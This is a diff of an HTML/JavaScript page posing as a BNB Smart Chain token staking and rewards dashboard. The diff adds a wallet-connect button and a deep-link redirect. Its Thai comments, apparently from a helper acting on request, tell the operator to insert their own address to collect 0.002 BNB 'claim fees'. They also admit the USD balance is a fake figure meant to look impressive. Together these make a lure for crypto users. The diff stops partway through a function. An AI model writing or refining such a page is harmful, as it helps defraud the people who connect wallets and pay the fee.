@@ -35,7 +35,23 @@
         .brand-title { font-size: 20px; font-weight: 800; color: #10b981; letter-spacing: 0.5px; }
         .net-badge { background-color: #1e293b; color: #f59e0b; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid #334155; }
         
-        /* สไตล์กระเป๋าเงินสากลดูแพง */
+        /* 🔵 ปุ่มกดเชื่อมต่อกระเป๋าเงินสไตล์อินเตอร์ */
+        .btn-connect-wallet {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(90deg, #2563eb, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(37,99,235,0.3);
+            transition: 0.2s;
+        }
+        .btn-connect-wallet:hover { opacity: 0.9; transform: translateY(-1px); }
+
         .dashboard-card {
             background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
             border: 1px solid #334155;
@@ -53,7 +69,6 @@
         .main-balance { font-size: 32px; font-weight: 700; margin: 8px 0; color: #ffffff; font-family: monospace; }
         .wallet-addr { font-size: 12px; color: #64748b; font-family: monospace; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
-        /* แผงควบคุมระบบฝากเหรียญ (Staking Platform) */
         .staking-section {
             background: rgba(15, 23, 42, 0.6);
             border: 1px dashed #334155;
@@ -67,13 +82,11 @@
         .staked-box { flex: 1; background: #111827; padding: 12px; border-radius: 12px; text-align: left; }
         .staked-val { font-size: 18px; font-weight: bold; color: #38bdf8; font-family: monospace; margin-top: 4px; }
         
-        /* ลิสต์รายการเหรียญ */
         .asset-container { margin-bottom: 20px; }
         .asset-row { display: flex; justify-content: space-between; align-items: center; padding: 14px; background: #111827; border-radius: 14px; margin-bottom: 8px; border: 1px solid #1f2937; }
         .asset-info { font-weight: bold; font-size: 15px; display: flex; align-items: center; gap: 8px; }
         .asset-crypto-bal { text-align: right; font-weight: bold; color: #fff; font-family: monospace; }
 
-        /* ปุ่มกดดีไซน์สากล */
         .btn-primary { width: 100%; padding: 14px; background: linear-gradient(90deg, #10b981, #059669); color: white; border: none; border-radius: 14px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; box-shadow: 0 4px 12px rgba(16,185,129,0.2); }
         .btn-action-group { display: flex; gap: 10px; margin-top: 15px; }
         .btn-sub { flex: 1; padding: 12px; background-color: #1e293b; color: white; border: 1px solid #334155; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 14px; }
@@ -92,14 +105,15 @@
         <div class="net-badge">BNB SMART CHAIN</div>
     </div>
 
-    <!-- กระเป๋าเงินส่วนหน้าหลักแสดงยอดเงินรวมดอลลาร์ -->
+    <!-- 🔵 ปุ่มสับเปลี่ยนสั่งเชื่อมต่อกระเป๋าจริง (เพิ่มมาตามคำขอแล้วครับ) -->
+    <button id="connectWalletBtn" class="btn-connect-wallet" onclick="actionConnectWallet()">🔗 Connect Smart Wallet</button>
+
     <div class="dashboard-card">
         <div class="balance-title">Estimated Total Balance</div>
         <div id="totalUSD" class="main-balance">$0.00</div>
         <div id="walletDisplay" class="wallet-addr">🔒 Wallet Disconnected</div>
     </div>
 
-    <!-- ระบบฝากเหรียญรับดอกเบี้ยสากล (Staking Node) -->
     <div class="staking-section">
         <div class="staking-header">
             <div>📈 <b>TKR Staking Pool</b></div>
@@ -121,7 +135,6 @@
         </div>
     </div>
 
-    <!-- รายการทรัพย์สินเงินดิจิทัลที่มีในระบบ -->
     <div class="asset-container">
         <div class="asset-row">
             <div class="asset-info">🔶 BNB (Native)</div>
@@ -133,72 +146,61 @@
         </div>
     </div>
 
-    <!-- ปุ่มระบบจัดสรรรางวัลและรับแต้มของคุณพี่ -->
     <button class="btn-primary" onclick="handleFreeCheckIn()">📅 Daily Check-In (รับ TKR พอยต์ฟรี)</button>
     <button class="btn-claim-gold" onclick="handleClaimRewards()">💎 Claim Tokens to Smart Wallet</button>
 
     <div style="margin-top: 15px; font-size: 11px; color: #475569; text-align: center;">*การเคลมโทเค็นรางวัลจะมีค่าธรรมเนียมเครือข่ายส่งเข้าโหนดแอดมิน</div>
-    <div style="margin-top: 12px;" id="terminalLog" class="terminal-log">System Status: Waiting for connection...</div>
+    <div style="margin-top: 12px;" id="terminalLog" class="terminal-log">System Status: Please connect wallet to start.</div>
 </div>
 
 <script>
     // 📍 จุดสำคัญ: เปลี่ยนตรงนี้เป็นหมายเลขกระเป๋า BNB ของคุณพี่เพื่อรอรับเงินค่าธรรมเนียมครับ
     const MY_RECEIVER_ADDRESS = "0x06B020DCcd0b2b005264c9a31cAba3b7e4A4bF27"; 
-    const CLAIM_FEE_BNB = "0.002"; // ค่าธรรมเนียมตอนกดเคลม
+    const CLAIM_FEE_BNB = "0.002"; 
 
     let userAddress = "";
     let tkrPoints = 0;
 
-    // ระบบเชื่อมต่อกระเป๋าอัตโนมัติเมื่อกดหน้าจอ
-    async function initWallet() {
+    // ฟังก์ชันสั่งเรียกเชื่อมกระเป๋าผ่านปุ่มกดตรง ๆ (Manual Click)
+    async function actionConnectWallet() {
+        const log = document.getElementById('terminalLog');
+        const btn = document.getElementById('connectWalletBtn');
+        
         if (!window.ethereum) {
-            document.getElementById('terminalLog').innerText = "❌ กรุณาเปิดผ่านแอป MetaMask หรือ Trust Wallet";
-            return false;
+            // หากเปิดนอกแอปกระเป๋า ให้ทำ Deep Link ไปดึงตัวแอปขึ้นมาทำงาน
+            const currentUrl = window.location.href.replace('https://', '').replace('http://', '');
+            window.location.href = "https://app.link" + currentUrl;
+            log.innerText = "⏳ Redirecting to MetaMask App...";
+            return;
         }
+
         try {
+            log.innerText = "⏳ Connecting to Wallet...";
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             const signer = provider.getSigner();
             userAddress = await signer.getAddress();
             
+            // เปลี่ยนสถานะแสดงผลบนหน้าจอเมื่อต่อกระเป๋าสำเร็จ
             document.getElementById('walletDisplay').innerText = "💳 " + userAddress;
+            btn.innerText = "✅ Wallet Connected";
+            btn.style.background = "linear-gradient(90deg, #10b981, #059669)";
             
+            // ดึงยอดเงินมาโชว์จริง
             const balance = await provider.getBalance(userAddress);
             const bnbVal = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
             document.getElementById('bnbBalance').innerText = bnbVal + " BNB";
-            
-            // คำนวณมูลค่าดอลลาร์สมมติให้ดูอินเตอร์สากล
             document.getElementById('totalUSD').innerText = "$" + (bnbVal * 400).toFixed(2);
-            document.getElementById('terminalLog').innerText = "🟢 Node Connected Successfully.";
-            return true;
+            
+            log.innerText = "🟢 Smart Node Connected. Ready for operations.";
         } catch (e) {
-            document.getElementById('terminalLog').innerText = "❌ Connection Denied.";
-            return false;
+            log.innerText = "❌ Connection Denied by User.";
         }
     }
 
-    // เรียกเชื่อมต่อกระเป๋าเงินทันทีเมื่อโหลดหน้าจอ
-    window.addEventListener('load', () => { setTimeout(initWallet, 500); });
-
-    // ฟังก์ชันเช็คอินสะสมแต้มฟรีร่วมกับ api หลังบ้านเดิม
     async function handleFreeCheckIn() {
-        if (!userAddress) { const connected = await initWallet(); if(!connected) return; }
         const log = document.getElementById('terminalLog');
-        log.innerText = "⏳ Syncing data to secure mail node...";
-        
-        try {
-            const response = await fetch('/api/checkin', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ walletAddress: userAddress })
-            });
-            const data = await response.json();
-            if (data.success) {
-                tkrPoints += 10;
-                document.getElementById('tkrBalance').innerText = tkrPoints + " TKR";
-                log.innerText = "🎯 Check-In Recorded. Reward Points +10 TKR Allocated.";
-            }
-        } catch (error) {
+        if (!userAddress) {
+            log.innerText = "⚠️ Please click 'Connect Smart Wallet' button first!";
 
-   
           
